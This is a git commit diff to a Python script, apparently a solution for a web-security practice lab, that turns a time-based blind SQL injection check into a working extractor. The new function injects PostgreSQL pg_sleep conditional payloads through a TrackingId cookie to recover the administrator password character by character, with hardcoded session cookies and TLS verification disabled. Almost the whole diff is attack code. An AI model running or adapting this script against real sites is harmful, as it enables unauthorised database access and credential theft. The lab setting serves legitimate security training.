688e1183b455819ef35da799b03b9b687802f3f2
Ben Vilakazi <xolanithengubane@gmail.com>
2024-01-10 21:55:50 +0200

    kids

--- lab-13/sqli-lab-13.py
+++ lab-13/sqli-lab-13.py
@@ -5,28 +5,35 @@ import urllib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def blind_sqli_check(url):
-    sqli_payload = "' || (SELECT pg_sleep(10))--"
-    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-    cookies = {'TrackingId': 'fY3mWGvtddfW37rS' + sqli_payload_encoded, 'session': '3tjAqEsmAUv1oSufDDKMp8Dpr9LKqwcd'}
-    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-    if int(r.elapsed.total_seconds()) > 10:
-        print("(+) Vulnerable to blind-based SQL injection")
-    else:
-        print("(-) Not vulnerable to blind based SQL injection")
+def sqli_password(url):
+    password_extracted = ""
+    for i in range(1,21):
+        for j in range(32,126):
+            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
+            sql_payload_encoded = urllib.parse.quote(sql_payload)
+            cookies = {'TrackingId': '4kvqBxnpvcbcGVXk' + sql_payload_encoded, 'session': 'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'}
+            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+            if int(r.elapsed.total_seconds()) > 9:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
 
 
 def main():
     if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
-        pring("(+) Example: %s www.example.com" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
 
     url = sys.argv[1]
-    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
-    blind_sqli_check(url)
+    print("(+) Retreiving administrator password...")
+    sqli_password(url) 
 
 if __name__ == "__main__":
     main()
